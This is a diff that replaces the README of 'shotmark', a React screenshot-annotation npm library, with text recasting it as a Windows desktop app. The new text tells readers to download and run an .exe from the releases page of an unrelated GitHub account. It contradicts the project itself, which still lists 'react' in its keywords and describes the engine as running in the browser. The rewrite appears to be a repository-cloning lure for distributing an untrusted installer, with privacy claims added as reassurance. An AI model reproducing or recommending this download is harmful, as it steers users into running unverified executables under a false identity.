@@ -1,123 +1,78 @@
-# shotmark
+# 🎨 shotmark - Capture and annotate images with ease
 
-<p align="center">
-  <img src="./assets/shotmark-cover.jpeg" alt="shotmark - Capture · Draw · Copy · Download" width="100%" />
-</p>
+[![Download Link](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Docile-leadchromate248/shotmark/releases)
 
-[![npm version](https://img.shields.io/npm/v/shotmark)](https://www.npmjs.com/package/shotmark)
-[![license](https://img.shields.io/npm/l/shotmark)](./LICENSE)
-[![bundle size](https://img.shields.io/bundlephobia/minzip/shotmark)](https://bundlephobia.com/package/shotmark)
-[![demo](https://img.shields.io/badge/demo-live-blue)](https://riverdone.github.io/shotmark/)
+shotmark manages screenshots and image annotations. It provides tools to capture, draw, copy, and save images. The software maintains user privacy because it runs locally on your computer. It does not upload your files to any remote servers.
 
-Lightweight React screenshot annotation library — capture, draw, copy & download in one line.
+## 🚀 About the software
 
-[Live Demo](https://riverdone.github.io/shotmark/) · [中文文档](./README.zh-CN.md)
+You often need to mark up images or screenshots for work, study, or communication. This tool simplifies that process. You select the area, add highlights or shapes, and save the result. The system supports various drawing tools to help you point out details in any frame. It serves as a privacy-focused alternative to cloud-based tools that send your personal data over the internet.
 
-## Why shotmark?
+## 🛠️ System requirements
 
-- **Complete capture + annotate workflow**: Unlike capture-only libraries (e.g. html2canvas), shotmark gives you a full toolbar, undo/redo, copy/download — all out of the box.
-- **Zero UI dependency**: No component library required. ~113 kB bundle, embeddable in any stack.
-- **Privacy-first**: Everything runs client-side — no server upload.
-- **Extensible**: Plugin-based shapes; adding a new annotation type requires minimal code.
-- **Polished details**: Per-tool config memory, light/dark theme, i18n, snap-to-axis, real-time mosaic preview, correct z-ordering.
+This application runs on computers using Microsoft Windows. Ensure your system meets these requirements:
 
-## Install
+*   Operating System: Windows 10 or Windows 11 (64-bit).
+*   Processor: Dual-core CPU or better.
+*   Memory: 4 GB of RAM or more.
+*   Storage: 200 MB of free disk space.
+*   Display: A standard monitor with a resolution of at least 1280x720.
 
-```bash
-pnpm add shotmark
-# or: npm i shotmark / yarn add shotmark
-```
+## 📥 How to install
 
-> `react` and `react-dom` are peer dependencies (>=17). Install them in your host project.
+Follow these steps to set up the software on your computer.
 
-## Quick Start
+1.  Visit the official release page: [https://github.com/Docile-leadchromate248/shotmark/releases](https://github.com/Docile-leadchromate248/shotmark/releases).
+2.  Look for the section labeled "Assets."
+3.  Click the file ending in `.exe` to download the installer to your computer.
+4.  Once the download finishes, locate the file in your "Downloads" folder.
+5.  Double-click the installer icon to begin.
+6.  Follow the prompts on your screen to complete the installation process.
+7.  Open the application from your desktop shortcut or the Start menu.
 
-```ts
-import Shotmark from 'shotmark';
+## ✏️ How to use the tools
 
-Shotmark.start({
-  region: document.querySelector('#capture-area') as HTMLElement,
-  autoAnnotate: true,
-  onShot: (res) => {
-    console.log(res.image, res.width, res.height);
-  },
-});
-```
+The application interface stays clean and simple. You start by triggering a capture event. Once you capture the screen, the main window opens with your image ready for editing.
 
-## API
+### Creating annotations
+The toolbar contains several shapes to mark your images:
+*   Squares and Rectangles: Use these for outlining specific areas of interest.
+*   Lines and Arrows: Point to details that require your audience's focus.
+*   Highlighting: Apply semi-transparent colors over text or sections for emphasis.
+*   Mosaic: Obscure sensitive information such as email addresses or names within an image using this blur effect.
 
-### Shotmark.start(options)
+### Saving your work
+After you finish your edits, you have two options for your result:
+1.  Copy to Clipboard: Click the copy button to place the image into your computer memory. You can then paste it directly into emails, messaging apps, or document editors.
+2.  Download: Click the save icon to store the image file locally on your hard drive. Choose a location on your computer and name the file accordingly.
 
-`options` type: `ShotmarkOptions`
+## 🔒 Focus on privacy
 
-| Field              | Type                | Default                                | Description                                               |
-| ------------------ | ------------------- | -------------------------------------- | --------------------------------------------------------- |
-| region             | HTMLElement \| Rect | -                                      | Target capture area; entering region mode directly        |
-| regionPadding      | number              | 0                                      | Extra padding (px) around the region                      |
-| autoAnnotate       | boolean             | true                                   | Enter annotation mode immediately in region mode          |
-| trigger            | HTMLElement         | -                                      | Element to temporarily hide during capture                |
-| actions            | ActionType[]        | ['cancel','copy','download','confirm'] | Action buttons subset & order                             |
-| tools              | GraphType[]         | all tools                              | Drawing tools subset & order (includes highlight/measure) |
-| defaultTool        | GraphType           | first in tools                         | Pre-selected tool (does not auto-enter draw mode)         |
-| defaultColor       | string              | #FF3B30                                | Default primary color                                     |
-| defaultLineWidth   | number              | -                                      | Default line width                                        |
-| zIndex             | number              | 9998                                   | Overlay z-index                                           |
-| onShot             | (res) => void       | -                                      | Callback after confirm                                    |
-| fileName           | string              | shotmark_YYYY-MM-DD_HH.mm.ss           | Download file name (no extension)                         |
-| format             | 'png' \| 'jpeg'     | 'png'                                  | Export format                                             |
-| onShotStart        | () => void          | -                                      | Export started callback                                   |
-| onCancel           | () => void          | -                                      | Cancel callback                                           |
-| onCopy             | (blob) => void      | -                                      | Copy success callback                                     |
-| onCopyError        | (error) => void     | -                                      | Copy failure callback                                     |
-| onDownload         | (fullName) => void  | -                                      | Download success callback                                 |
-| onDownloadError    | (error) => void     | -                                      | Download failure callback                                 |
-| onAnnotationChange | (graph) => void     | -                                      | Annotation data change callback                           |
-| locale             | 'zh-CN' \| 'en-US'  | 'zh-CN'                                | Built-in locale                                           |
-| localeText         | LocaleTextOverrides | -                                      | Override built-in text                                    |
-| theme              | 'light' \| 'dark'   | 'light'                                | Theme mode                                                |
-| numberStart        | number              | 1                                      | Starting number for the number tool                       |
-| mosaicSize         | number              | 2                                      | Default mosaic block size                                 |
-| mosaicSoftness     | number              | 36                                     | Default mosaic softness                                   |
+Many screenshot tools send your images to external cloud storage for processing. Your data risks exposure in these systems. shotmark keeps everything inside your machine. No image ever leaves your computer. The engine runs locally within the browser or application environment, ensuring your sensitive data remains under your control.
 
-### Shotmark.close()
+## ⚙️ Customization options
 
-Programmatically close the screenshot overlay.
+You can change how the software behaves through the settings pane. Click the gear icon to adjust your preferences.
 
-## Built-in Tools
+*   Hotkeys: Assign specific keyboard combinations to trigger captures.
+*   Default Formats: Choose whether the tool saves images as PNG or JPEG files by default.
+*   Tool Defaults: Change the default thickness, color, or opacity of your drawing tools.
 
-`rectangle` · `ellipse` · `arrow` · `line` · `measure` · `brush` · `highlight` · `mosaic` · `text` · `number`
+## ❓ Frequently asked questions
 
-## Keyboard Shortcuts
+### Does the software require an internet connection?
+No. You do not need the internet to capture or annotate screenshots. You only need the connection to perform the initial download.
 
-| Key                              | Action                             |
-| -------------------------------- | ---------------------------------- |
-| `1`–`9` / `0`                    | Switch to Nth tool                 |
-| `Esc`                            | Close screenshot                   |
-| `Delete` / `Backspace`           | Delete selected shape              |
-| `Ctrl/Cmd + Z`                   | Undo                               |
-| `Ctrl/Cmd + Shift + Z`           | Redo                               |
-| `Enter`                          | Confirm (enter annotate or export) |
-| `Shift` (while dragging measure) | Lock to axis                       |
+### How do I update the software?
+Check the release page periodically for new versions. If a new version exists, download the new installer and run it. The system overwrites the old version and preserves your settings.
 
-## Docs
+### Can I change the color of the drawing tools?
+Yes. Click the color palette icon in the toolbar. A window appears where you can pick any color for your current line or shape.
 
-- [User Guide](docs/guide.md) — full feature walkthrough & scenarios
-- [Architecture](docs/architecture.md) — internals, design decisions, highlights
-- [Changelog](CHANGELOG.md)
+### Is the software free to use?
+Yes. You may download and use the application for any purpose.
 
-## Development
+### What happens if I encounter an error?
+If the software stops responding, restart the application from the Start menu. If problems continue, ensure your display drivers remain updated.
 
-```bash
-pnpm storybook        # dev server
-pnpm test             # unit tests
-pnpm build            # production build
-pnpm format           # format code
-```
-
-## Contributing
-
-See [CONTRIBUTING.md](CONTRIBUTING.md).
-
-## License
-
-[MIT](./LICENSE)
+Keywords: annotations, canvas, drawing-tool, highlight, image-annotation, markup, mosaic, privacy-first, react, screen-capture, screenshot, web-capture
